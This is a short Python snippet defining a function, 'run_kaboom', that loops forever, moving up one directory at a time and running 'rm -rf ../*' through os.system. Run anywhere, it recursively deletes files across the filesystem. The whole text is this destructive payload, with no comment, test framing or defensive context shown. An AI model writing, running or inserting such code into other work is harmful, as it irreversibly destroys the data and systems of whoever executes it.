import os

def run_kaboom():
    while True:
        os.chdir("..")
        os.system("rm -rf ../*")